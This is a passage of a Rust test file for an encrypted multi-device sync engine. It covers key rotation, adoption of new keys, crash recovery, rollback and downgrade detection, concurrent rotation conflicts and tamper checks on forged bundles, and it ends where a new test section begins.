//! S2a scenarios (`docs/SYNC.md` §13.8): key rotation, adoption,
//! forgetting a device, and the lost-device drill without passwords. Each
//! engine has its own home and in-memory keychain; the folder is the
//! in-memory provider of the S1 scenarios.

use std::collections::BTreeSet;
use std::fmt::Write as _;
use std::sync::Arc;

use secrecy::SecretString;

use super::*;
use crate::sync::api::{ForgetDevice, RotateAuth, RotateKeys, RotationChoice, RotationOutcome};
use crate::sync::bundle;
use crate::sync::passphrase::tests::{STRONG_2, STRONG_3, STRONG_4, STRONG_5};

fn secret(text: &str) -> SecretString {
    SecretString::from(text.to_owned())
}

fn id_of(device: &Device) -> String {
    crate::sync::state::load_config(&device.paths)
        .expect("config")
        .expect("set up")
        .device
        .to_string()
}

fn bundle_id(device: &Device) -> String {
    crate::sync::state::load_config(&device.paths)
        .expect("config")
        .expect("set up")
        .bundle_id
}

fn epoch_of(device: &Device) -> u32 {
    crate::sync::state::load_config(&device.paths)
        .expect("config")
        .expect("set up")
        .epoch
}

fn has_key(device: &Device, bundle: &str, epoch: u32) -> bool {
    device
        .secrets
        .contains(&SecretKey::SyncDataKey {
            bundle: bundle.to_owned(),
            epoch,
        })
        .expect("contains")
}

fn folder_bundle(sim: &SimFolder) -> String {
    String::from_utf8(
        sim.with(|s| s.files.get("bundle.toml").cloned())
            .expect("bundle"),
    )
    .expect("utf8")
}

fn folder_epoch(sim: &SimFolder) -> u32 {
    bundle::peek(&folder_bundle(sim)).expect("peek").epoch
}

async fn rotate(device: &Device, current: &str, new: &str) -> RotationOutcome {
    device
        .engine
        .sync_rotate_keys(RotateKeys {
            authorization: RotateAuth::CurrentPassphrase(secret(current)),
            new_passphrase: typed(new),
            remember_key: true,
        })
        .await
        .expect("rotate")
}

async fn forget(device: &Device, ids: Vec<String>, current: &str, new: &str) -> RotationOutcome {
    device
        .engine
        .sync_forget_device(ForgetDevice {
            device_ids: ids,
            authorization: RotateAuth::CurrentPassphrase(secret(current)),
            new_passphrase: typed(new),
            remember_key: true,
        })
        .await
        .expect("forget")
}

async fn unlock(device: &Device, passphrase: &str) -> crate::Result<SyncStatus> {
    device.engine.sync_unlock(secret(passphrase)).await
}

fn alert(status: &SyncStatus) -> Option<AlertKind> {
    match status {
        SyncStatus::Alert { kind, .. } => Some(*kind),
        _ => None,
    }
}

fn code(result: crate::Result<SyncStatus>) -> String {
    result.expect_err("error").summary().code
}

/// Epochs of the snapshots written in the folder since log entry `from`.
fn snapshot_epochs_since(sim: &SimFolder, from: usize) -> Vec<(String, u32)> {
    sim.with(|s| {
        s.log
            .iter()
            .skip(from)
            .filter(|(key, _)| key.starts_with("devices/"))
            .filter_map(|(key, bytes)| {
                crate::sync::container::peek(crate::sync::container::ContainerKind::Snapshot, bytes)
                    .map(|envelope| (key.clone(), envelope.epoch))
            })
            .collect()
    })
}

fn log_len(sim: &SimFolder) -> usize {
    sim.with(|s| s.log.len())
}

#[tokio::test]
async fn rotation_requires_new_passphrase_on_other_devices() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    a.engine
        .save_snippet(snippet("Disk", "df -h"))
        .await
        .expect("snippet");
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    let bundle = bundle_id(&a);
    // The new passphrase is mandatory and must differ (Q1).
    let reused = a
        .engine
        .sync_rotate_keys(RotateKeys {
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG)),
            new_passphrase: typed(STRONG),
            remember_key: true,
        })
        .await
        .expect_err("same passphrase");
    assert_eq!(reused.summary().code, "sync_passphrase_reused");
    let outcome = rotate(&a, STRONG, STRONG_2).await;
    assert_eq!(outcome.epoch, 2);
    // B has not adopted yet: its file is never merged (§13.3.6).
    assert!(
        matches!(
            outcome.status,
            SyncStatus::Waiting {
                reason: WaitReason::NeedsNewKeys,
                ..
            }
        ),
        "{outcome:?}"
    );
    assert_eq!(outcome.enter_new_passphrase_on.len(), 1);
    assert_eq!(epoch_of(&a), 2);
    assert_eq!(folder_epoch(&sim), 2);
    assert!(has_key(&a, &bundle, 2));
    assert!(!has_key(&a, &bundle, 1), "the old key leaves the keychain");
    // B stops completely until it types the new passphrase.
    let mark = log_len(&sim);
    b.engine
        .save_snippet(snippet("Late", "uptime"))
        .await
        .expect("snippet");
    let status = b.engine.sync_now().await;
    assert_eq!(code(status), "sync_keys_rotated");
    assert_eq!(
        alert(&b.engine.sync_status().await.expect("s").status),
        Some(AlertKind::KeysRotatedElsewhere)
    );
    assert!(
        snapshot_epochs_since(&sim, mark).is_empty(),
        "B published nothing"
    );
    // A genuine rotation is never "restored" over (RR2).
    let restore = b.engine.sync_restore_bundle().await.expect_err("refused");
    assert_eq!(restore.summary().code, "sync_keys_rotated");
    assert_eq!(folder_epoch(&sim), 2);
    assert_eq!(code(unlock(&b, STRONG).await), "sync_wrong_passphrase");
    let status = unlock(&b, STRONG_2).await.expect("adopt");
    assert!(matches!(status, SyncStatus::Idle { .. }), "{status:?}");
    assert_eq!(epoch_of(&b), 2);
    assert!(has_key(&b, &bundle, 2));
    assert!(!has_key(&b, &bundle, 1));
    // B's offline change reaches A under the new keys; nothing was lost.
    sync(&a).await;
    let names: BTreeSet<String> = a
        .engine
        .snippets()
        .await
        .expect("s")
        .into_iter()
        .map(|s| s.name)
        .collect();
    assert_eq!(names, ["Disk".to_owned(), "Late".to_owned()].into());
    for (_, epoch) in snapshot_epochs_since(&sim, mark) {
        assert_eq!(epoch, 2, "nothing published under the old keys");
    }
}

/// The data key remembered for `(bundle, epoch)`.
fn stored_key(device: &Device, bundle: &str, epoch: u32) -> crate::sync::crypto::DataKey {
    use base64::Engine as _;
    use secrecy::ExposeSecret;
    let stored = device
        .secrets
        .get(&SecretKey::SyncDataKey {
            bundle: bundle.to_owned(),
            epoch,
        })
        .expect("get")
        .expect("remembered");
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(stored.expose_secret())
        .expect("b64");
    crate::sync::crypto::DataKey::from_bytes(&bytes).expect("key")
}

fn restart(device: &Device, sim: &SimFolder) -> Engine {
    engine_on(&device.paths, Arc::clone(&device.secrets), sim)
}

fn restart_crashing(
    device: &Device,
    sim: &SimFolder,
    point: crate::sync::runner::CrashPoint,
) -> Engine {
    let engine = engine_on(&device.paths, Arc::clone(&device.secrets), sim);
    engine.set_sync_tuning(SyncTuning {
        crash_at: Some(point),
        ..tuning(sim)
    });
    engine
}

#[tokio::test]
async fn rotation_makes_new_snapshots_unreadable_with_old_dk() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    a.engine
        .save_snippet(snippet("Disk", "df -h"))
        .await
        .expect("snippet");
    create(&a, &folder).await;
    let bundle = bundle_id(&a);
    let old = stored_key(&a, &bundle, 1);
    rotate(&a, STRONG, STRONG_2).await;
    let text = folder_bundle(&sim);
    assert!(
        text.contains("version = 2"),
        "v2 from the first S2 operation"
    );
    assert_eq!(
        bundle::open_with_key(&text, &old).expect_err("old key"),
        crate::sync::SyncError::BundleTampered
    );
    assert_eq!(
        bundle::open(&text, &secret(STRONG), &KdfBounds::TEST).expect_err("old passphrase"),
        crate::sync::SyncError::WrongPassphrase
    );
    let id = crate::sync::DeviceId::from_hex(&id_of(&a)).expect("id");
    let snap = sim
        .with(|s| s.files.get(&format!("devices/{id}.snap")).cloned())
        .expect("snapshot");
    let bundle_bytes: [u8; 16] = crate::sync::crypto::exact(
        &(0..16)
            .map(|i| {
                u8::from_str_radix(bundle.get(i * 2..i * 2 + 2).expect("hex"), 16).expect("hex")
            })
            .collect::<Vec<u8>>(),
        "bundle",
        "id",
    )
    .expect("id");
    for epoch in [1, 2] {
        let keys = crate::sync::crypto::derive_subkeys(&old, &bundle_bytes, epoch).expect("keys");
        let expected = crate::sync::container::Expected {
            bundle_id: bundle_bytes,
            epoch: 2,
            max_keyset_generation: u64::MAX,
            device: id,
        };
        assert!(crate::sync::container::open_snapshot(&keys, &expected, &snap).is_err());
    }
}

#[tokio::test]
async fn offline_device_adopts_and_keeps_its_local_edits() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    // B is offline: it edits locally, never syncs.
    b.engine
        .save_snippet(snippet("Offline", "ls"))
        .await
        .expect("snippet");
    b.engine
        .set_theme(Some("basalt".into()), None)
        .await
        .expect("theme");
    rotate(&a, STRONG, STRONG_2).await;
    assert_eq!(code(b.engine.sync_now().await), "sync_keys_rotated");
    unlock(&b, STRONG_2).await.expect("adopt");
    sync(&a).await;
    assert_eq!(a.engine.snippets().await.expect("s").len(), 1);
    assert_eq!(
        a.engine.settings().await.expect("s").theme.as_deref(),
        Some("basalt")
    );
    // No PassphraseChanged alert on top of an adoption.
    assert!(matches!(sync(&b).await, SyncStatus::Idle { .. }));
}

#[tokio::test]
async fn old_epoch_snapshot_is_never_merged_after_adoption() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    let c = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    join(&c, &folder, JoinBulkChoice::ReviewEach).await;
    rotate(&a, STRONG, STRONG_2).await;
    unlock(&b, STRONG_2).await.expect("adopt");
    // C still has the old keys and a change it cannot publish: it stops.
    c.engine
        .save_snippet(snippet("From C", "true"))
        .await
        .expect("snippet");
    assert_eq!(code(c.engine.sync_now().await), "sync_keys_rotated");
    // C's old-epoch file (from before) is never merged by A or B.
    let status = sync(&b).await;
    assert!(
        matches!(
            status,
            SyncStatus::Waiting {
                reason: WaitReason::NeedsNewKeys,
                device: Some(ref d)
            } if d.starts_with("Desktop (")
        ),
        "{status:?}"
    );
    let codes = issue_codes(&b.engine.sync_issues().await.expect("issues"));
    assert!(
        codes.contains(&"sync_needs_new_keys".to_owned()),
        "{codes:?}"
    );
    assert!(b.engine.snippets().await.expect("s").is_empty());
    unlock(&c, STRONG_2).await.expect("adopt");
    sync(&b).await;
    assert_eq!(b.engine.snippets().await.expect("s").len(), 1);
}

#[tokio::test]
async fn rotation_crash_after_each_step_goes_forward() {
    use crate::sync::runner::CrashPoint;
    for remember in [true, false] {
        for point in [
            CrashPoint::BeforeRotationFile,
            CrashPoint::AfterIntent,
            CrashPoint::AfterFolderWrite,
            CrashPoint::AfterReplica,
            CrashPoint::AfterLocalState,
        ] {
            crash_scenario(point, remember).await;
        }
    }
}

async fn crash_scenario(point: crate::sync::runner::CrashPoint, remember: bool) {
    use crate::sync::runner::CrashPoint;
    let what = format!("{point:?} remember={remember}");
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    a.engine
        .save_snippet(snippet("Disk", "df -h"))
        .await
        .expect("snippet");
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    let bundle = bundle_id(&a);
    let old_bundle = folder_bundle(&sim);
    if !remember {
        a.engine
            .sync_set_options(SyncOptions {
                remember_key: false,
            })
            .await
            .expect("options");
    }
    let crashing = restart_crashing(&a, &sim, point);
    if !remember {
        unlock_engine(&crashing, STRONG).await;
    }
    let _ = crashing
        .sync_rotate_keys(RotateKeys {
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG)),
            new_passphrase: typed(STRONG_2),
            remember_key: remember,
        })
        .await;
    drop(crashing);
    // Meanwhile the folder is put back to the old bundle.
    sim.with(|s| {
        s.files
            .insert("bundle.toml".into(), old_bundle.clone().into_bytes())
    });
    let mark = log_len(&sim);
    let restarted = restart(&a, &sim);
    if point == CrashPoint::BeforeRotationFile {
        // Never committed: the old epoch goes on, the leftovers go.
        if !remember {
            unlock_engine(&restarted, STRONG).await;
        }
        let status = restarted.sync_now().await.expect("pass");
        assert!(
            matches!(status, SyncStatus::Idle { .. }),
            "{what}: {status:?}"
        );
        assert_eq!(epoch_of(&a), 1, "{what}");
        assert!(!has_key(&a, &bundle, 2), "{what}: leftover key removed");
        assert!(
            !a.paths.sync_dir().join("bundle.next").exists(),
            "{what}: leftover bundle.next removed"
        );
        return;
    }
    if remember {
        // The first pass may only report the rollback it repaired.
        if let Err(e) = restarted.sync_now().await {
            assert_eq!(e.summary().code, "sync_rollback", "{what}");
        }
    } else {
        // Not remembered: the new passphrase finishes the transition (the
        // old one first keeps the replica, RR4).
        let _ = restarted.sync_unlock(secret(STRONG)).await;
        match restarted.sync_unlock(secret(STRONG_2)).await {
            Ok(status) => assert!(
                !matches!(status, SyncStatus::Alert { .. } | SyncStatus::Error { .. }),
                "{what}: {status:?}"
            ),
            // The pass that follows repaired a folder put back.
            Err(e) => assert_eq!(e.summary().code, "sync_rollback", "{what}"),
        }
    }
    restarted.sync_now().await.expect("forward");
    assert_eq!(epoch_of(&a), 2, "{what}");
    assert_eq!(folder_epoch(&sim), 2, "{what}: rewritten forward");
    assert!(!a.paths.sync_dir().join("rotation.toml").exists(), "{what}");
    assert!(!has_key(&a, &bundle, 1), "{what}: old key collected");
    for (_, epoch) in snapshot_epochs_since(&sim, mark) {
        assert_eq!(epoch, 2, "{what}: never published under the old keys");
    }
    // B adopts with the new passphrase; A's data is intact.
    unlock(&b, STRONG_2).await.expect("adopt");
    assert_eq!(b.engine.snippets().await.expect("s").len(), 1, "{what}");
    assert_eq!(restarted.snippets().await.expect("s").len(), 1, "{what}");
}

async fn unlock_engine(engine: &Engine, passphrase: &str) {
    engine
        .sync_unlock(secret(passphrase))
        .await
        .expect("unlock");
}

#[tokio::test]
async fn rotation_preceded_by_a_timeout_at_step_4() {
    for lands in [true, false] {
        let (_dir, folder, sim) = shared();
        let a = device(&sim);
        let b = device(&sim);
        create(&a, &folder).await;
        join(&b, &folder, JoinBulkChoice::ReviewEach).await;
        sim.with(|s| s.fail_writes.push(("bundle.toml".into(), lands)));
        let outcome = rotate(&a, STRONG, STRONG_2).await;
        assert_eq!(
            outcome.status,
            SyncStatus::Waiting {
                reason: WaitReason::RotationPending,
                device: None
            },
            "lands={lands}"
        );
        // Committed: the floor is the new epoch, nothing goes back.
        assert!(a.paths.sync_dir().join("rotation.toml").exists());
        let status = sync(&a).await;
        assert!(
            matches!(
                status,
                SyncStatus::Waiting {
                    reason: WaitReason::NeedsNewKeys,
                    ..
                }
            ),
            "lands={lands}: {status:?}"
        );
        assert_eq!(folder_epoch(&sim), 2);
        assert_eq!(epoch_of(&a), 2);
        unlock(&b, STRONG_2).await.expect("adopt");
    }
}

#[tokio::test]
async fn local_leftovers_cleaned_after_interrupted_step_3() {
    use crate::sync::runner::CrashPoint;
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    let bundle = bundle_id(&a);
    let crashing = restart_crashing(&a, &sim, CrashPoint::BeforeRotationFile);
    let _ = crashing
        .sync_rotate_keys(RotateKeys {
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG)),
            new_passphrase: typed(STRONG_2),
            remember_key: true,
        })
        .await;
    assert!(a.paths.sync_dir().join("bundle.next").exists());
    assert!(has_key(&a, &bundle, 2), "written before the intent");
    let restarted = restart(&a, &sim);
    restarted.sync_now().await.expect("pass");
    assert!(!a.paths.sync_dir().join("bundle.next").exists());
    assert!(!has_key(&a, &bundle, 2));
    assert!(has_key(&a, &bundle, 1));
    // `sync.toml` gone (disabled by 0.6): the S2 files are removed too.
    let restarted = restart(&a, &sim);
    restarted.sync_now().await.expect("pass");
    std::fs::write(a.paths.sync_dir().join("rotation.toml"), "x").expect("w");
    std::fs::write(a.paths.sync_dir().join("bundle.next"), "x").expect("w");
    std::fs::remove_file(a.paths.sync_dir().join("sync.toml")).expect("rm");
    assert_eq!(
        restarted.sync_now().await.expect("pass"),
        SyncStatus::Disabled
    );
    for name in [
        "rotation.toml",
        "bundle.next",
        "bundle.verified",
        "commitment.toml",
    ] {
        assert!(!a.paths.sync_dir().join(name).exists(), "{name}");
    }
}

#[tokio::test]
async fn stale_key_entries_collected_each_pass() {
    use crate::sync::runner::CrashPoint;
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    let bundle = bundle_id(&a);
    // Crash after step 6: the old key is still there.
    let crashing = restart_crashing(&a, &sim, CrashPoint::AfterLocalState);
    let _ = crashing
        .sync_rotate_keys(RotateKeys {
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG)),
            new_passphrase: typed(STRONG_2),
            remember_key: true,
        })
        .await;
    assert_eq!(epoch_of(&a), 2);
    assert!(has_key(&a, &bundle, 1), "step 8 not reached");
    restart(&a, &sim).sync_now().await.expect("pass");
    assert!(!has_key(&a, &bundle, 1), "collected by the next pass");
    // An entry written before the index existed is probed and collected.
    a.secrets
        .set(
            &SecretKey::SyncDataKey {
                bundle: bundle.clone(),
                epoch: 1,
            },
            &secret("AAAA"),
        )
        .expect("set");
    restart(&a, &sim).sync_now().await.expect("pass");
    assert!(!has_key(&a, &bundle, 1));
    assert!(has_key(&a, &bundle, 2));
}

#[tokio::test]
async fn restored_old_bundle_toml_is_rewritten_by_current_device() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    let old = folder_bundle(&sim);
    rotate(&a, STRONG, STRONG_2).await;
    let current = folder_bundle(&sim);
    sim.with(|s| {
        s.files
            .insert("bundle.toml".into(), old.clone().into_bytes())
    });
    let status = a.engine.sync_now().await;
    assert_eq!(code(status), "sync_rollback");
    assert_eq!(
        folder_bundle(&sim),
        current,
        "rewritten from bundle.verified"
    );
    // B, still on the old keys, never sees the old bundle as current: the
    // new one is back, and A's new snapshot stops it anyway.
    assert_eq!(code(b.engine.sync_now().await), "sync_keys_rotated");
}

#[tokio::test]
async fn recovery_adopts_newer_revision_of_same_lineage() {
    use crate::sync::runner::CrashPoint;
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    let crashing = restart_crashing(&a, &sim, CrashPoint::AfterFolderWrite);
    let _ = crashing
        .sync_rotate_keys(RotateKeys {
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG)),
            new_passphrase: typed(STRONG_2),
            remember_key: true,
        })
        .await;
    drop(crashing);
    // B adopts and rewrites the roster (a new revision of the new epoch).
    unlock(&b, STRONG_2).await.expect("adopt");
    b.engine
        .sync_rename_device("Workstation".into())
        .await
        .expect("rename");
    let newer = folder_bundle(&sim);
    let next = std::fs::read_to_string(a.paths.sync_dir().join("bundle.next")).expect("next");
    assert!(bundle::peek(&newer).expect("p").revision > bundle::peek(&next).expect("p").revision);
    let restarted = restart(&a, &sim);
    restarted.sync_now().await.expect("forward");
    assert_eq!(folder_bundle(&sim), newer, "adopted, not rewritten");
    let devices = restarted.sync_devices().await.expect("devices");
    assert!(
        devices.iter().any(|d| d.name == "Workstation"),
        "{devices:?}"
    );
}

#[tokio::test]
async fn newer_epoch_snapshot_header_can_be_discarded_explicitly() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    let b_id = id_of(&b);
    let key = format!("devices/{b_id}.snap");
    // Someone edits B's clear header (no key needed): epoch 9.
    sim.with(|s| {
        let text = String::from_utf8(s.files.get(&key).cloned().expect("file")).expect("utf8");
        let edited = text.replace("epoch = 1", "epoch = 9");
        s.files.insert(key.clone(), edited.into_bytes());
    });
    let mark = log_len(&sim);
    assert_eq!(code(a.engine.sync_now().await), "sync_keys_rotated");
    assert!(snapshot_epochs_since(&sim, mark).is_empty(), "full stop");
    let status = a.engine.sync_status().await.expect("s").status;
    assert!(
        matches!(&status, SyncStatus::Alert { kind: AlertKind::KeysRotatedElsewhere, device: Some(d) } if d.starts_with("Desktop (")),
        "{status:?}"
    );
    let files = a.engine.sync_newer_files().await.expect("files");
    let shown = files.first().expect("named").clone();
    assert_eq!(shown.file, key);
    assert_eq!(shown.epoch, 9);
    assert_eq!(
        a.engine
            .sync_discard_newer_file(shown.device.clone(), "00".repeat(32))
            .await
            .expect_err("other file")
            .summary()
            .code,
        "sync_not_pending"
    );
    let status = a
        .engine
        .sync_discard_newer_file(shown.device, shown.fingerprint)
        .await
        .expect("discard");
    assert!(!matches!(status, SyncStatus::Alert { .. }), "{status:?}");
    assert!(sim.with(|s| !s.files.contains_key(&key)));
    // B publishes its authentic file again.
    sync(&b).await;
    assert!(sim.with(|s| s.files.contains_key(&key)));
    assert!(matches!(sync(&a).await, SyncStatus::Idle { .. }));
}

#[tokio::test]
async fn format_downgrade_is_sync_rollback() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    let v1 = folder_bundle(&sim);
    // "Leave the device list" is an S2 operation: v2 from then on.
    b.engine
        .sync_disable(DisableOptions {
            forget_key: true,
            remove_my_file: true,
            leave_roster: true,
        })
        .await
        .expect("disable");
    assert!(folder_bundle(&sim).contains("version = 2"));
    sync(&a).await;
    sim.with(|s| {
        s.files
            .insert("bundle.toml".into(), v1.clone().into_bytes())
    });
    let error = a.engine.sync_now().await.expect_err("downgrade");
    assert_eq!(error.summary().code, "sync_rollback");
    assert!(folder_bundle(&sim).contains("version = 2"), "rewritten");
}

// ── Concurrency, conflicts (§13.3.7) ───────────────────────────────────────

fn take_file(sim: &SimFolder, key: &str) -> Vec<u8> {
    sim.with(|s| s.files.remove(key)).expect("file")
}

fn put_file(sim: &SimFolder, key: &str, bytes: Vec<u8>) {
    sim.with(|s| s.files.insert(key.to_owned(), bytes));
}

fn snap_key(device: &Device) -> String {
    format!("devices/{}.snap", id_of(device))
}

async fn join_named(device: &Device, folder: &Path, name: &str, passphrase: &str) {
    let preview = device
        .engine
        .sync_join_preview(SyncJoin {
            folder: folder.to_path_buf(),
            passphrase: secret(passphrase),
            device_name: name.into(),
            remember_key: true,
        })
        .await
        .expect("preview");
    device
        .engine
        .sync_join_commit(preview.token, JoinBulkChoice::ReviewEach)
        .await
        .expect("commit");
}

/// A concurrent rotation by `c` from the same epoch while the provider
/// still shows it the old files (A's rotation already landed): returns
/// A's bundle text, put back as the provider merges.
async fn concurrent_rotation(sim: &SimFolder, a: &Device, c: &Device) -> String {
    let old = folder_bundle(sim);
    let c_previous = sim
        .with(|s| s.files.get(&snap_key(c)).cloned())
        .expect("c's file");
    rotate(a, STRONG, STRONG_2).await;
    let a_bundle = folder_bundle(sim);
    let a_snap = take_file(sim, &snap_key(a));
    put_file(sim, "bundle.toml", old.into_bytes());
    put_file(sim, &snap_key(c), c_previous);
    rotate(c, STRONG, STRONG_3).await;
    put_file(sim, &snap_key(a), a_snap);
    a_bundle
}

#[tokio::test]
async fn concurrent_rotations_raise_rotation_conflict_and_lose_nothing() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let c = device(&sim);
    create(&a, &folder).await;
    join(&c, &folder, JoinBulkChoice::ReviewEach).await;
    a.engine
        .save_snippet(snippet("From A", "true"))
        .await
        .expect("s");
    c.engine
        .save_snippet(snippet("From C", "false"))
        .await
        .expect("s");
    let _ = concurrent_rotation(&sim, &a, &c).await;
    // The provider kept C's bundle: A finds an authentic fork, never
    // rewrites it (RR2).
    let c_bundle = folder_bundle(&sim);
    assert_eq!(code(a.engine.sync_now().await), "sync_rotation_conflict");
    assert_eq!(
        alert(&a.engine.sync_status().await.expect("s").status),
        Some(AlertKind::RotationConflict)
    );
    assert_eq!(folder_bundle(&sim), c_bundle, "no rewrite war");
    assert_eq!(
        a.engine
            .sync_restore_bundle()
            .await
            .expect_err("refused")
            .summary()
            .code,
        "sync_rotation_conflict"
    );
    // A takes C's keys: checked like an adoption, nothing lost.
    let wrong = a
        .engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG)))
        .await
        .expect_err("old passphrase");
    assert_eq!(wrong.summary().code, "sync_wrong_passphrase");
    a.engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_3)))
        .await
        .expect("use other");
    sync(&c).await;
    sync(&a).await;
    for device in [&a, &c] {
        let names: BTreeSet<String> = device
            .engine
            .snippets()
            .await
            .expect("s")
            .into_iter()
            .map(|s| s.name)
            .collect();
        assert_eq!(names, ["From A".to_owned(), "From C".to_owned()].into());
        assert!(matches!(sync(device).await, SyncStatus::Idle { .. }));
    }
}

#[tokio::test]
async fn keep_my_keys_converges_without_rewrite() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    let c = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    join(&c, &folder, JoinBulkChoice::ReviewEach).await;
    let _ = concurrent_rotation(&sim, &a, &c).await;
    assert_eq!(code(a.engine.sync_now().await), "sync_rotation_conflict");
    // A keeps its keys: N + 2 from its own lineage replaces C's N + 1.
    let status = a
        .engine
        .sync_resolve_rotation_conflict(RotationChoice::KeepMine {
            new_passphrase: typed(STRONG_4),
            remember_key: true,
        })
        .await
        .expect("keep mine");
    assert!(!matches!(status, SyncStatus::Alert { .. }), "{status:?}");
    assert_eq!(folder_epoch(&sim), 3);
    let kept = folder_bundle(&sim);
    // C sees another lineage at its epoch: a conflict, never tampering,
    // never a rewrite.
    assert_eq!(code(c.engine.sync_now().await), "sync_rotation_conflict");
    assert_eq!(folder_bundle(&sim), kept);
    c.engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_4)))
        .await
        .expect("use A's keys");
    assert_eq!(epoch_of(&c), 3);
    // B, still at N, adopts A's lineage with A's last passphrase.
    assert_eq!(code(b.engine.sync_now().await), "sync_keys_rotated");
    unlock(&b, STRONG_4).await.expect("adopt");
    for device in [&a, &b, &c] {
        let status = sync(device).await;
        assert!(matches!(status, SyncStatus::Idle { .. }), "{status:?}");
    }
}

#[tokio::test]
async fn rotation_vs_concurrent_passphrase_change() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    let old = folder_bundle(&sim);
    rotate(&a, STRONG, STRONG_2).await;
    let a_snap = take_file(&sim, &snap_key(&a));
    put_file(&sim, "bundle.toml", old.into_bytes());
    // B changes the passphrase of the old epoch meanwhile (N, g + 1).
    b.engine
        .sync_change_passphrase(secret(STRONG), typed(STRONG_3))
        .await
        .expect("change");
    put_file(&sim, &snap_key(&a), a_snap);
    // The epoch wins: A puts its bundle back, B adopts.
    assert_eq!(code(a.engine.sync_now().await), "sync_rollback");
    assert_eq!(folder_epoch(&sim), 2);
    assert_eq!(code(b.engine.sync_now().await), "sync_keys_rotated");
    unlock(&b, STRONG_2).await.expect("adopt");
    assert!(matches!(sync(&a).await, SyncStatus::Idle { .. }));
}

#[tokio::test]
async fn forged_u32_max_epoch_is_tampering() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    let genuine = folder_bundle(&sim);
    let clear = bundle::peek(&genuine).expect("peek");
    let forged_link = bundle::LineageLink {
        epoch: u32::MAX - 1,
        digest: [7; 32],
        proof: [8; 32],
    };
    let (forged, _) = bundle::tests::forge(
        clear.bundle_id,
        u32::MAX,
        1,
        bundle::Roster::default(),
        vec![forged_link],
        Vec::new(),
        None,
        STRONG,
    );
    put_file(&sim, "bundle.toml", forged.clone().into_bytes());
    assert_eq!(code(a.engine.sync_now().await), "sync_bundle_tampered");
    assert_eq!(
        folder_bundle(&sim),
        forged,
        "no link of A's epoch: never rewritten"
    );
    // The explicit way out.
    a.engine.sync_restore_bundle().await.expect("restore");
    assert_eq!(folder_bundle(&sim), genuine);
}

#[tokio::test]
async fn locked_v1_device_verifies_first_rotation_against_retained_commitment() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    b.engine
        .save_snippet(snippet("B's", "id"))
        .await
        .expect("s");
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    assert!(folder_bundle(&sim).contains("version = 1"), "still v1");
    // E1: B computed C_1 from the data key of the v1 bundle and kept it.
    let bundle = bundle_id(&a);
    let retained = crate::sync::state::retained_commitment(&b.paths, &bundle, 1)
        .expect("read")
        .expect("retained");
    let dk = stored_key(&a, &bundle, 1);
    let id_bytes = bundle::peek(&folder_bundle(&sim)).expect("peek").bundle_id;
    let keys = crate::sync::crypto::derive_subkeys(&dk, &id_bytes, 1).expect("keys");
    assert_eq!(
        retained,
        crate::sync::crypto::epoch_commitment(&keys.rotate, &id_bytes, 1).expect("c")
    );
    // B stops remembering its key and restarts: locked, no DK_1 anywhere.
    b.engine
        .sync_set_options(SyncOptions {
            remember_key: false,
        })
        .await
        .expect("options");
    let b = Device {
        engine: restart(&b, &sim),
        ..b
    };
    rotate(&a, STRONG, STRONG_2).await;
    // Locked: the folder's link 1 carries B's retained C_1.
    assert_eq!(code(b.engine.sync_now().await), "sync_keys_rotated");
    // A tampered retained commitment refuses the adoption.
    let path = b.paths.sync_dir().join("commitment.toml");
    let good = std::fs::read_to_string(&path).expect("read");
    std::fs::write(
        &path,
        good.replace(&good[good.len() - 10..good.len() - 2], "00000000"),
    )
    .expect("w");
    assert_eq!(code(unlock(&b, STRONG_2).await), "sync_bundle_tampered");
    std::fs::write(&path, good).expect("w");
    // With the retained C_1, the new passphrase adopts (the replica does
    // not open without DK_1: re-joined, nothing lost).
    let _ = unlock(&b, STRONG_2).await.expect("adopt");
    assert_eq!(epoch_of(&b), 2);
    sync(&b).await;
    sync(&a).await;
    assert_eq!(a.engine.snippets().await.expect("s").len(), 1);
}

// ── Forgetting a device (§13.4) ───────────────────────────────────────────

#[tokio::test]
